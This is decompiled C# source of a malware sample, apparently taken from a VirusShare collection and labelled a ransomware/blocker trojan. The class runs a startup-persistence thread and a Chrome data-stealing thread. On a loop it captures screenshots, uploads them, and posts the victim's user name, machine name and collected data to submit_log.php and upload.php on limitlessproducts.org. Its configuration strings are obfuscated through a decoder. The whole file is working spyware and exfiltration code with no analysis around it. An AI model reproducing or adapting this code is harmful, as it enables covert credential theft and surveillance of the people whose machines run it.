// Decompiled with JetBrains decompiler
// Type: LOIFDUM
// Assembly: ServerPHP, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 6F25B3EA-9C2B-406D-A5C7-3B7C6942C4C5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.kwu-cbd4f8ac3865079e515f22b836eb2d279bf8687da866b97896c91bd38f105d09.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class LOIFDUM
{
  public static string TXHGCMMI;
  public static string BHOVDBMX;
  public static string TVUNKUQG;
  public static string FFInfo;
  public static string YJQUQGLK;
  public static string SVYNYLTX;
  public static string UTMEJYQM;
  public static string CVCKFDPY;
  public static string CCKRUOEJ;
  public static string KYNPUTHC;
  public static string LCDMTOCK;
  public static string WUMUJW;
  public static string OPFURQDG;
  public static string XGRMBX;
  public static string FFStuff;
  public static string MHGSSER = "";
  public static string TGPMNJJI = EHMIWRQ.VIJVUUV("USEREMAIL", "False");
  public static string UQCRWYQO = EHMIWRQ.VIJVUUV("USERPASS", "False");
  public static string LVJDQQTL = EHMIWRQ.VIJVUUV("USERSMTP", "False");
  public static int CLTONVNV = 587;
  public static string JEDSEGDL = EHMIWRQ.VIJVUUV("DLEXSite", "False");
  public static string JQVOYYOL = EHMIWRQ.VIJVUUV("USERSITE", "False");
  public static string PPGVJOBE = EHMIWRQ.VIJVUUV("USERTYPE", "False");
  public static string ULTMCGBH = EHMIWRQ.VIJVUUV("USERTITLE", "False");
  public static string JNUCRRGM = EHMIWRQ.VIJVUUV("USERBODY", "False");
  public static string TVWLHJTV = EHMIWRQ.VIJVUUV("USERSCREENSHOTS", "False");
  public static string FLIFQBTN = EHMIWRQ.VIJVUUV("dqzC0LQW", "False");
  public static int VXRXFHVY = 900000;
  public static string SCJGBDTR = "";
  public static string WEWRTGQP = "";
  public static int number = 0;
  public static XNNKMUW GPYTFPQ;
  public static Thread KROKMSR = new Thread(new ThreadStart(LOIFDUM.QUJHDUJ));
  public static Thread GCThread = new Thread(new ThreadStart(DAChrome.GTCHRME));
  public static Thread NBQWILW = new Thread(new ThreadStart(LOIFDUM.OHKWIGC));
  public static Thread STRTTHRD = new Thread(new ThreadStart(DAStartup.Startupdll.StartPers));

  [STAThread]
  public static void Main()
  {
    try
    {
      Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.png*"))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      LOIFDUM.STRTTHRD.IsBackground = true;
      LOIFDUM.STRTTHRD.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      LOIFDUM.GPYTFPQ = new XNNKMUW(LOIFDUM.WEWRTGQP);
      XNNKMUW.PYEWXKY();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.EndApp();
      ProjectData.ClearProjectError();
    }
    try
    {
      LOIFDUM.KROKMSR.IsBackground = true;
      LOIFDUM.KROKMSR.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      LOIFDUM.GCThread.IsBackground = true;
      LOIFDUM.GCThread.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      LOIFDUM.NBQWILW.IsBackground = true;
      LOIFDUM.NBQWILW.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void QUJHDUJ()
  {
    int num = 0;
    bool flag = true;
    while (true)
    {
      Thread.Sleep(LOIFDUM.VXRXFHVY);
      string str1 = "";
      Thread.Sleep(100);
      string str2;
      try
      {
        WebClient webClient = new WebClient();
        str2 = EHMIWRQ.VIJVUUV("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(EHMIWRQ.VIJVUUV("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + EHMIWRQ.VIJVUUV("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(500);
      try
      {
        if (Operators.CompareString(LOIFDUM.WEWRTGQP, "", false) != 0)
        {
          LOIFDUM.SCJGBDTR = LOIFDUM.WEWRTGQP + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
          try
          {
            StringBuilder data = new StringBuilder();
            data.Append("content=" + LOIFDUM.SCJGBDTR);
            data.Append("&user=Anthracite");
            data.Append("&title=" + EHMIWRQ.VIJVUUV("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + EHMIWRQ.VIJVUUV("aQ0=", "False") + Environment.MachineName.ToString());
            if (!flag)
            {
              data.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/default.png");
            }
            else
            {
              try
              {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                bitmap.Save(Path.GetTempPath() + "ss" + num.ToString() + ".png");
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              string str3 = Post.UploadImage("http://www.limitlessproducts.org/Limitless/Login/upload.php", Path.GetTempPath() + "ss" + num.ToString() + ".png");
              data.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/" + str3 + ".png");
              checked { ++num; }
            }
            Conversions.ToString(Post.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), Post.RequestMethods.Post, data));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      LOIFDUM.SCJGBDTR = "";
      LOIFDUM.WEWRTGQP = "";
      LOIFDUM.MHGSSER = "";
      checked { ++LOIFDUM.number; }
    }
  }

  public static void OHKWIGC()
  {
    int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False"))).Length;
    new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EHMIWRQ.VIJVUUV("eoatrq+NrLOxsXp7pa6ok6m3pyw=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False"))).GetFiles();
    try
    {
      Thread.Sleep(25000);
      string Left = LOIFDUM.TXHGCMMI.ToString() + Environment.NewLine + Environment.NewLine + LOIFDUM.BHOVDBMX + Environment.NewLine + Environment.NewLine + LOIFDUM.TVUNKUQG + Environment.NewLine + Environment.NewLine + LOIFDUM.YJQUQGLK + Environment.NewLine + Environment.NewLine + LOIFDUM.SVYNYLTX + Environment.NewLine + Environment.NewLine + LOIFDUM.UTMEJYQM + Environment.NewLine + Environment.NewLine + LOIFDUM.CVCKFDPY + Environment.NewLine + Environment.NewLine + LOIFDUM.CCKRUOEJ + Environment.NewLine + Environment.NewLine + LOIFDUM.LCDMTOCK + Environment.NewLine + Environment.NewLine + LOIFDUM.WUMUJW + Environment.NewLine + Environment.NewLine + LOIFDUM.OPFURQDG + Environment.NewLine + Environment.NewLine + LOIFDUM.XGRMBX;
      if (!(Operators.CompareString(Left, "", false) != 0 | Operators.CompareString(Left, (string) null, false) != 0))
        return;
      try
      {
        StringBuilder data = new StringBuilder();
        data.Append("content=" + Left);
        data.Append("&user=Anthracite");
        data.Append("&title=" + EHMIWRQ.VIJVUUV("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + EHMIWRQ.VIJVUUV("aQ0=", EHMIWRQ.VIJVUUV("g7nP3cEJ", "False")) + Environment.MachineName.ToString());
        data.Append("&path=http://www.limitlessproducts.org/Limitless/Login/screenshots/default.png");
        Conversions.ToString(Post.SendData(new Uri("http://www.limitlessproducts.org/Limitless/Login/submit_log.php"), Post.RequestMethods.Post, data));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
